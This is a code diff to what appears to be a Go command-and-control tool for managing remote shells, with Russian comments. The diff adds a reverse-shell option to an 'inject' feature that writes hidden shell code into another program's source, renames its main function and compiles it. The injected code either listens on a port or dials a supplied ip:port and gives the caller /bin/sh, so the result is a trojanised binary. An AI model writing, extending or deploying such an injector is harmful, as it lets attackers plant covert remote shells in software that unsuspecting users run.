@@ -35,7 +35,7 @@ func BindShellHelp() {
 	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host.")
 
 	fmt.Println("\n\t\tShell injecting:")
-	fmt.Println("\t- /BS inject \t\t\tInject bind shell to code and compile it. (BETA)")
+	fmt.Println("\t- /BS inject <file_path> <shell_type> <OS> <Arch> <ip> <port> \t\tInject bind shell to code and compile it. (BETA)")
 
 	fmt.Println("\n\t\tConfiguration:")
 	fmt.Println("\t- /BS config \t\t\tGet current configuration;")
@@ -223,7 +223,7 @@ func BindShellLoadTargets(targets *[]Target, targets_file string) {
 	}
 }
 
-func BindShellInject(file_path string, OS string, Arch string, port int) {
+func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 	// Открытие оригинального файла
 	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
 	if err != nil {
@@ -302,8 +302,19 @@ func BindShellInject(file_path string, OS string, Arch string, port int) {
 		return
 	}
 
-	// Строка с инъекцией
-	BS_string := fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":%d\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, port)
+	// Инициализация строки с инъекцией
+	BS_string := ""
+
+	// Заполнение строки с инъекцией
+	switch shell_type {
+	case "bind":
+		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":%d\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, port)
+	case "reverse":
+		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_conn, _ := net.Dial(\"tcp\", \"%s:%d\")\n\tbs_handle(BS_conn)\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, ip, port)
+	default:
+		fmt.Println("[BindShell] Incorrect shell type!")
+		return
+	}
 
 	// Добавление инъекции в файл
 	if _, err := new_file.WriteString(BS_string); err != nil {
@@ -416,9 +427,9 @@ func BindShellRequest(request []string, targets *[]Target) {
 	case "help":
 		BindShellHelp()
 	case "inject":
-		ok, value := checkPositiveNumber(request[5])
+		ok, value := checkPositiveNumber(request[7])
 		if ok {
-			BindShellInject(request[2], request[3], request[4], value)
+			BindShellInject(request[2], request[3], request[4], request[5], request[6], value)
 		}
 	case "off":
 		// Если аргументов более трех, остановка
